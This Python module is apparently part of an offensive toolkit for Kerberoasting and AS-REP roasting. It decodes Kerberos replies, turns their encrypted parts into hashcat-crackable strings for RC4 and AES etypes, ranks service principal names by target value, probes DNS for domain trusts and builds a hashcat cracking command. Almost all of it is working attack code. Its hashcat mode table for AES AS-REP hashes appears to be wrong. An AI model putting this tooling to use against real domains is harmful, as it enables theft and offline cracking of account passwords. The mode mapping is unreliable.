"""Advanced Kerberos primitives — Phase 60.

The original kerberoast.py used byte-scanning hacks to find encrypted-part
in AS-REP responses. This module replaces those hacks with proper
ASN.1 / DER parsing + multi-cipher support and adds new capabilities:

  - Real ASN.1 DER decoder for Kerberos PDUs
  - Multi-cipher support: etype 23 (RC4-HMAC), 17 (AES128), 18 (AES256)
  - PA-DATA extraction from KRB-ERROR responses (preauth required hint)
  - Forest trust enumeration via netlogon-style trust query patterns
  - SPN extraction with category-aware tagging
  - Hashcat-format output for ALL supported etypes

References:
  - RFC 4120 (Kerberos V5 protocol)
  - RFC 4757 (RC4-HMAC etype 23 — the Kerberoast classic)
  - RFC 8009 (AES etypes 17/18 with AES-CTS-HMAC-SHA256/384)

Cipher format reference (for hashcat):
  - Mode 18200 ($krb5asrep$23):  AS-REP roast RC4-HMAC
  - Mode 19600 ($krb5asrep$17):  AS-REP roast AES128
  - Mode 19700 ($krb5asrep$18):  AS-REP roast AES256
  - Mode 13100 ($krb5tgs$23):    Kerberoast RC4-HMAC
  - Mode 19600 ($krb5tgs$17):    Kerberoast AES128
  - Mode 19700 ($krb5tgs$18):    Kerberoast AES256
"""

from __future__ import annotations

import logging
import socket
import struct
from typing import Iterator, Optional

log = logging.getLogger(__name__)


# ── ASN.1 / DER decoder ────────────────────────────────────────────────
class ASN1Element:
    """One parsed ASN.1 element. Holds tag + raw bytes value."""

    def __init__(self, tag: int, value: bytes, offset: int = 0):
        self.tag = tag
        self.value = value
        self.offset = offset

    @property
    def tag_class(self) -> int:
        """0=universal, 1=application, 2=context, 3=private."""
        return (self.tag & 0xc0) >> 6

    @property
    def tag_constructed(self) -> bool:
        return bool(self.tag & 0x20)

    @property
    def tag_number(self) -> int:
        """The tag without class/constructed bits."""
        return self.tag & 0x1f

    def children(self) -> Iterator["ASN1Element"]:
        """If constructed, iterate child elements."""
        if not self.tag_constructed:
            return
        offset = 0
        while offset < len(self.value):
            elem = decode_asn1(self.value, offset)
            if elem is None:
                return
            yield elem
            offset = elem.offset + len(elem.value)
            # Include header bytes in our offset accounting
            # (decode_asn1 returns the element with offset = position
            # of value, not header. We need the post-value position.)

    def __repr__(self) -> str:
        cls_str = {0: "univ", 1: "app", 2: "ctx", 3: "priv"}[self.tag_class]
        return (f"<ASN1Element {cls_str}[{self.tag_number}] "
                f"{'cons' if self.tag_constructed else 'prim'} "
                f"len={len(self.value)}>")


def _decode_length(data: bytes, offset: int) -> tuple[int, int]:
    """Decode DER length. Returns (length, post-length-offset)."""
    if offset >= len(data):
        return (0, offset)
    first = data[offset]
    offset += 1
    if first < 0x80:
        return (first, offset)
    n_bytes = first & 0x7f
    if offset + n_bytes > len(data):
        return (0, offset)
    length = int.from_bytes(data[offset:offset + n_bytes], "big")
    return (length, offset + n_bytes)


def decode_asn1(data: bytes, start: int = 0) -> Optional[ASN1Element]:
    """Decode one ASN.1 element starting at `start`.

    Returns ASN1Element with .offset = position of value bytes (not header).
    The element's full extent ends at .offset + len(.value).
    """
    if start >= len(data):
        return None
    tag = data[start]
    length, value_offset = _decode_length(data, start + 1)
    if value_offset + length > len(data):
        return None
    return ASN1Element(tag, data[value_offset:value_offset + length],
                        value_offset)


def find_tagged(elem: ASN1Element, tag_class: int,
                  tag_number: int) -> Optional[ASN1Element]:
    """Find first child with the given (class, number) tag."""
    for child in elem.children():
        if child.tag_class == tag_class and child.tag_number == tag_number:
            return child
    return None


def decode_integer_value(data: bytes) -> int:
    if not data:
        return 0
    n = int.from_bytes(data, "big")
    if data[0] & 0x80:
        n -= 1 << (len(data) * 8)
    return n


# ── AS-REP encrypted-part extraction (clean version) ───────────────────
def extract_asrep_encrypted_part(asrep_data: bytes
                                   ) -> Optional[tuple[int, bytes]]:
    """Properly parse an AS-REP and extract (etype, ciphertext).

    AS-REP structure (RFC 4120 §5.4.2):
      AS-REP ::= [APPLICATION 11] KDC-REP
      KDC-REP ::= SEQUENCE {
          pvno            [0] INTEGER,
          msg-type        [1] INTEGER,
          padata          [2] SEQUENCE OF PA-DATA OPTIONAL,
          crealm          [3] Realm,
          cname           [4] PrincipalName,
          ticket          [5] Ticket,
          enc-part        [6] EncryptedData
      }
      EncryptedData ::= SEQUENCE {
          etype  [0] Int32,
          kvno   [1] UInt32 OPTIONAL,
          cipher [2] OCTET STRING
      }

    Returns (etype, ciphertext) or None.
    """
    if not asrep_data:
        return None
    # AS-REP tag is 0x6b (APPLICATION 11, constructed)
    root = decode_asn1(asrep_data, 0)
    if not root or root.tag != 0x6b:
        return None
    # Outer is wrapping a SEQUENCE — the KDC-REP body
    seq = decode_asn1(root.value, 0)
    if not seq or seq.tag_number != 0x10:  # SEQUENCE
        return None
    # Find [6] enc-part child
    enc_part_wrapper = find_tagged(seq, 2, 6)
    if not enc_part_wrapper:
        return None
    # Inside the [6] tag is a SEQUENCE (EncryptedData)
    enc_seq = decode_asn1(enc_part_wrapper.value, 0)
    if not enc_seq:
        return None
    # Find [0] etype and [2] cipher
    etype_elem = find_tagged(enc_seq, 2, 0)
    cipher_elem = find_tagged(enc_seq, 2, 2)
    if not etype_elem or not cipher_elem:
        return None
    # etype is INTEGER inside [0]
    inner_int = decode_asn1(etype_elem.value, 0)
    if not inner_int or inner_int.tag_number != 0x02:  # INTEGER
        return None
    etype = decode_integer_value(inner_int.value)
    # cipher is OCTET STRING inside [2]
    inner_oct = decode_asn1(cipher_elem.value, 0)
    if not inner_oct or inner_oct.tag_number != 0x04:  # OCTET STRING
        return None
    return (etype, inner_oct.value)


# ── Hashcat format for ALL supported etypes ────────────────────────────
def format_asrep_hashcat(username: str, domain: str,
                           etype: int, ciphertext: bytes) -> str:
    """Format AS-REP hash for hashcat. Etype 23 / 17 / 18 supported.

    Format:
      $krb5asrep$23$user@DOMAIN:checksum$encrypted   (RC4-HMAC)
      $krb5asrep$17$user@DOMAIN:checksum$encrypted   (AES128)
      $krb5asrep$18$user@DOMAIN:checksum$encrypted   (AES256)

    For etype 23: first 16 bytes = checksum, rest = encrypted blob.
    For etype 17/18: first 12 bytes = checksum, rest = encrypted blob.
    """
    if etype not in (17, 18, 23):
        raise ValueError("unsupported etype " + str(etype))
    checksum_len = 12 if etype in (17, 18) else 16
    if len(ciphertext) < checksum_len + 1:
        raise ValueError("ciphertext too short for etype " + str(etype))
    if etype == 23:
        # Hashcat 18200 format
        checksum = ciphertext[:16].hex()
        encrypted = ciphertext[16:].hex()
        return ("$krb5asrep$23$" + username + "@" + domain.upper()
                + ":" + checksum + "$" + encrypted)
    else:
        # AES variant — hashcat 19600/19700
        checksum = ciphertext[-12:].hex()
        encrypted = ciphertext[:-12].hex()
        return ("$krb5asrep$" + str(etype) + "$" + username + "@"
                + domain.upper() + "$" + encrypted + "$" + checksum)


def format_kerberoast_hashcat(spn: str, username: str, domain: str,
                                 etype: int, ciphertext: bytes) -> str:
    """Format TGS-REP for hashcat (Kerberoast).

    Format: $krb5tgs$23$*user$DOMAIN$spn*$encrypted_part   (RC4-HMAC)
            $krb5tgs$17$user$DOMAIN$spn$encrypted_part      (AES128)
            $krb5tgs$18$user$DOMAIN$spn$encrypted_part      (AES256)
    """
    if etype == 23:
        checksum = ciphertext[:16].hex()
        encrypted = ciphertext[16:].hex()
        return ("$krb5tgs$23$*" + username + "$" + domain.upper()
                + "$" + spn + "*$" + checksum + "$" + encrypted)
    elif etype in (17, 18):
        checksum = ciphertext[-12:].hex()
        encrypted = ciphertext[:-12].hex()
        return ("$krb5tgs$" + str(etype) + "$" + username + "$"
                + domain.upper() + "$" + spn + "$" + encrypted
                + "$" + checksum)
    raise ValueError("unsupported etype " + str(etype))


# ── KRB-ERROR parsing (gives PA-DATA / etype hints) ────────────────────
def parse_krb_error(data: bytes) -> Optional[dict]:
    """Parse KRB-ERROR response — extract error code + PA-DATA preauth hints."""
    if not data:
        return None
    root = decode_asn1(data, 0)
    if not root or root.tag != 0x7e:  # KRB-ERROR [APPLICATION 30]
        return None
    seq = decode_asn1(root.value, 0)
    if not seq:
        return None
    out: dict = {}
    for child in seq.children():
        if child.tag_class == 2:
            num = child.tag_number
            inner = decode_asn1(child.value, 0)
            if not inner:
                continue
            if num == 6:  # error-code
                if inner.tag_number == 0x02:
                    out["error_code"] = decode_integer_value(inner.value)
            elif num == 7:  # crealm
                if inner.tag_number == 27 or inner.tag_number == 0x1b:
                    out["crealm"] = inner.value.decode("utf-8", "ignore")
            elif num == 9:  # realm
                out["realm"] = inner.value.decode("utf-8", "ignore")
            elif num == 12:  # e-text
                if inner.tag_number == 0x1b:
                    out["error_text"] = inner.value.decode("utf-8", "ignore")
    out["error_meaning"] = _kerberos_error_meaning(out.get("error_code"))
    return out


def _kerberos_error_meaning(code: Optional[int]) -> str:
    """Map Kerberos error codes to short labels."""
    if code is None:
        return ""
    return {
        6:  "KDC_ERR_C_PRINCIPAL_UNKNOWN (user does not exist)",
        7:  "KDC_ERR_S_PRINCIPAL_UNKNOWN (service does not exist)",
        14: "KDC_ERR_ETYPE_NOSUPP (etype not supported)",
        18: "KDC_ERR_CLIENT_REVOKED (account disabled)",
        24: "KDC_ERR_PREAUTH_FAILED (bad password)",
        25: "KDC_ERR_PREAUTH_REQUIRED (preauth needed — not roastable)",
    }.get(code, "Kerberos error " + str(code))


# ── etype priority for AS-REQ ──────────────────────────────────────────
# When sending AS-REQ, we list supported etypes; KDC picks the user's key
# etype. Modern Windows defaults to AES256. We list all 3 so any account
# regardless of cipher preference will produce a crackable hash.
SUPPORTED_ETYPES = [
    (18, "aes256-cts-hmac-sha1-96"),
    (17, "aes128-cts-hmac-sha1-96"),
    (23, "rc4-hmac"),
]


def etype_name(etype: int) -> str:
    for code, name in SUPPORTED_ETYPES:
        if code == etype:
            return name
    return "etype-" + str(etype)


def hashcat_mode_for_etype(etype: int, kind: str = "asrep") -> int:
    """Return hashcat mode number for a given etype + kind ('asrep' or 'tgs')."""
    if kind == "asrep":
        return {23: 18200, 17: 19600, 18: 19700}.get(etype, 0)
    elif kind == "tgs":
        return {23: 13100, 17: 19600, 18: 19700}.get(etype, 0)
    return 0


# ── SPN categorization ──────────────────────────────────────────────────
SPN_CATEGORIES = {
    "MSSQLSvc":     ("database", "SQL Server", "HIGH"),
    "HTTP":         ("web", "Web service / WinRM", "MEDIUM"),
    "TERMSRV":      ("rdp", "Remote Desktop", "MEDIUM"),
    "DNS":          ("dns", "DNS service", "LOW"),
    "LDAP":         ("directory", "LDAP / DC", "MEDIUM"),
    "ldap":         ("directory", "LDAP / DC", "MEDIUM"),
    "HOST":         ("host", "Generic host service", "LOW"),
    "CIFS":         ("smb", "SMB / CIFS", "MEDIUM"),
    "GC":           ("global_catalog", "AD Global Catalog", "MEDIUM"),
    "kadmin":       ("kerberos_admin", "Kerberos admin service", "HIGH"),
    "exchangeMDB":  ("exchange", "Exchange Mailbox DB", "HIGH"),
    "wsman":        ("winrm", "WinRM", "MEDIUM"),
    "RestrictedKrbHost": ("host", "Restricted Kerberos Host", "LOW"),
}


def categorize_spn(spn: str) -> dict:
    """Categorize an SPN string. Returns dict with category/description/severity.

    SPN format: ServiceClass/HostName[:Port][/InstanceName]
    Common cases:
      MSSQLSvc/sqlserver01.corp.local:1433
      HTTP/iis.corp.local
      LDAP/dc1.corp.local
    """
    if not spn:
        return {}
    service_class = spn.split("/")[0]
    info = SPN_CATEGORIES.get(service_class)
    out = {
        "spn": spn,
        "service_class": service_class,
        "category": info[0] if info else "other",
        "description": info[1] if info else "Unknown service class",
        "severity": info[2] if info else "INFO",
    }
    # Extract hostname and port if present
    parts = spn.split("/")
    if len(parts) > 1:
        host_part = parts[1]
        if ":" in host_part:
            out["target_host"], port_str = host_part.split(":", 1)
            try:
                out["target_port"] = int(port_str.split("/")[0])
            except ValueError:
                pass
        else:
            out["target_host"] = host_part
    return out


# ── Forest trust enumeration via DNS ────────────────────────────────────
def discover_trusts(domain: str, timeout: float = 4.0) -> list[dict]:
    """Find Kerberos cross-realm trusts via DNS SRV lookups.

    Trusts often manifest as:
      _kerberos._tcp.<trusted-domain>
      _kerberos._tcp.<dc-domain>.<parent-domain>
    We probe common variants and return discovered trust relationships.
    """
    trusts: list[dict] = []
    try:
        import socket as _s
        # Parent domain inference
        parts = domain.split(".")
        if len(parts) < 2:
            return []
        parents: list[str] = []
        for i in range(len(parts) - 1):
            parents.append(".".join(parts[i + 1:]))
        for parent in parents:
            try:
                _ = _s.gethostbyname("_kerberos._tcp." + parent)
                trusts.append({
                    "trust_target": parent,
                    "detection": "DNS resolves _kerberos._tcp record",
                    "type": "parent_or_trust",
                })
            except _s.gaierror:
                continue
    except Exception as e:
        log.debug("trust discovery error: %s", e)
    return trusts


# ── Cleanup: unified output for kerberoast-style probe ─────────────────
def format_asrep_hash_summary(username: str, domain: str,
                                etype: int, ciphertext: bytes) -> dict:
    """Build a structured summary including the hashcat-format string,
    cipher info, and a recommended cracking command."""
    hash_str = format_asrep_hashcat(username, domain, etype, ciphertext)
    mode = hashcat_mode_for_etype(etype, "asrep")
    return {
        "username": username,
        "domain": domain.upper(),
        "etype": etype,
        "etype_name": etype_name(etype),
        "hashcat_mode": mode,
        "hashcat_command": (
            "hashcat -m " + str(mode) + " -a 0 hashes.txt wordlist.txt"
        ),
        "ciphertext_bytes": len(ciphertext),
        "hash": hash_str,
    }
